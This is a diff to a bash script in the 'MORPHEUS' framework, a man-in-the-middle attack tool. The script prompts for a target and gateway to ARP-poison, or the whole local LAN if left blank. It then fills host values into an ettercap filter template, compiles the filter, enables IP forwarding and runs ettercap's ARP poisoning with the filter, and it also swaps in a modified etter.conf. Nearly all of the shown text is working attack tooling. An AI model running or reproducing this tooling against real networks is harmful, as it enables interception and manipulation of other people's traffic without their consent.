@@ -147,7 +147,22 @@ case $DiStR0 in
 clear
 
 # config internal framework settings
-ping -c 3 www.google.com | zenity --progress --pulsate --title "☠ MORPHEUS ☠" --text="Config internal framework settings..." --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+echo ${BlueF}[☠]${white} storing ip addr, ip range, interface${RedF}... ${Reset};
+sleep 1
+echo ${BlueF}[☠]${white} replacing original etter.conf File${RedF}...${Reset};
+ping -c 3 www.google.com | zenity --progress --pulsate --title "☠ MORPHEUS - antidote ☠" --text="Config internal framework settings..." --percentage=0 --auto-close --width 300 > /dev/null 2>&1
+if [ -e $Econ ]; then
+  echo ${BlueF}[☠]${white} All configurations${RedF}':'${white} done${RedF}!${Reset};
+  cp $Econ /tmp/etter.conf > /dev/null 2>&1
+  cp $IPATH/bin/etter.conf $Econ > /dev/null 2>&1
+  sleep 1
+else
+  echo ${RedF}[x]${white} morpheus cant Find:${RedF} $Econ ${Reset};
+  echo ${RedF}[x]${white} edit settings File to input path of etter.conf File ${Reset};
+  sleep 2
+  exit
+fi
+
 
 
 
@@ -178,7 +193,9 @@ fi
 
 
 
-
+# ----------------------------------------
+# PRE-CONFIGURATED TEMPLATE - FIREWALL.EFT
+# ----------------------------------------
 sh_stage9 () {
 cat << !
 ---
@@ -193,21 +210,30 @@ if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter RHOST ☠" --text "example: $IP\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
+rhost=$(zenity --title="☠ ARP poison [RHOST] ☠" --text "example: $IP\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
+gateway=$(zenity --title="☠ ARP poison [GATEWAY] ☠" --text "example: 192.168.1.254\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
   cp $IPATH/filters/firewall.eft $IPATH/filters/firewall.bk > /dev/null 2>&1
   sleep 1
-  echo ${BlueF}[☠]${white} Edit firewall.eft '(filter)'${RedF}!${Reset};  
-  xterm -T "MORPHEUS - firewall filter" -geometry 115x36 -e "nano $IPATH/filters/firewall.eft"
+
+  echo ${BlueF}[☠]${white} Edit firewall.eft '(filter)'${RedF}!${Reset};
+  sleep 1
+  fil_one=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose first target to filter." --entry --width 300) > /dev/null 2>&1
+  fil_two=$(zenity --title="☠ HOST TO FILTER ☠" --text "example: $IP\nchose last target to filter." --entry --width 300) > /dev/null 2>&1
+  # replace values in template.filter with sed bash command
+  cd $IPATH/filters
+  sed -i "s|TaRONE|$fil_one|g" firewall.eft
+  sed -i "s|TaRTWO|$fil_two|g" firewall.eft
+  cd $IPATH
+  zenity --info --title="☠ MORPHEUS SCRIPTING CONSOLE ☠" --text "morpheus framework now gives you\nthe oportunity to just run the filter OR\nto scripting it further...\n\n'Have fun scripting it further'..." --width 270 > /dev/null 2>&1
+  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/firewall.eft"
   sleep 1
 
     # compiling firewall.eft to be used in ettercap
     echo ${BlueF}[☠]${white} Compiling firewall.eft${RedF}!${Reset};
     xterm -T "MORPHEUS - compiling" -geometry 100x30 -e "etterfilter $IPATH/filters/firewall.eft -o $IPATH/output/firewall.ef && sleep 3"
     sleep 1
-
     # port-forward
     echo "1" > /proc/sys/net/ipv4/ip_forward
     cd $IPATH/logs
@@ -235,7 +261,7 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\
         ettercap -T -q -i $InT3R -F $IPATH/output/firewall.ef -L $IPATH/logs/firewall -M ARP /$rhost/ /$gateway/
         fi
       fi
-    
+
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
@@ -255,6 +281,9 @@ fi
 
 
 
+# ----------------------
+# WRITE YOUR OWN FILTER
+# ----------------------
 sh_stageW () {
 cat << !
 ---
@@ -270,14 +299,15 @@ if [ "$?" -eq "0" ]; then
 
 # get user input to build filter
 echo ${BlueF}[☠]${white} Enter filter settings${RedF}! ${Reset};
-rhost=$(zenity --title="☠ Enter RHOST ☠" --text "example: $IP\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
-gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "example: 192.168.1.254\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
+rhost=$(zenity --title="☠ ARP poison Enter RHOST ☠" --text "example: $IP\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
+gateway=$(zenity --title="☠ ARP poison Enter GATEWAY ☠" --text "example: 192.168.1.254\nLeave blank to poison all local lan." --entry --width 300) > /dev/null 2>&1
 
   echo ${BlueF}[☠]${white} Backup files needed${RedF}!${Reset};
   cp $IPATH/filters/template.eft $IPATH/filters/template.bk > /dev/null 2>&1
   sleep 1
-  echo ${BlueF}[☠]${white} Edit template '(filter)'${RedF}!${Reset};  
-  xterm -T "MORPHEUS - template filter" -geometry 115x36 -e "nano $IPATH/filters/template.eft"
+
+  echo ${BlueF}[☠]${white} Edit template '(filter)'${RedF}!${Reset};
+  xterm -T "MORPHEUS SCRIPTING CONSOLE" -geometry 115x36 -e "nano $IPATH/filters/template.eft"
   sleep 1
 
     # compiling template.eft to be used in ettercap
@@ -331,6 +361,9 @@ fi
 
 
 
+# ------------------------------------------------
+# NMAP FUNTION TO REPORT LIVE TARGETS IN LOCAL LAN
+# ------------------------------------------------
 sh_stageS () {
 cat << !
 ---
@@ -367,9 +400,17 @@ echo "[☠] stage 2 running..."
 sleep 2
 }
 
+
+
+# -------------------------
+# FUNTION TO EXIT FRAMEWORK
+# -------------------------
 sh_exit () {
-echo ${BlueF}[☠]${white} Exit morpheus '(blue_dream)' framework${RedF}! ${Reset};
-sleep 2
+echo ${BlueF}[☠]${white} Exit morpheus'(antidote)' framework${RedF}! ${Reset};
+sleep 1
+echo ${BlueF}[☠]${white} etter.conf reverted to default stage${RedF}! ${Reset};
+mv /tmp/etter.conf $Econ > /dev/null 2>&1
+sleep 1
 clear
 exit
 }
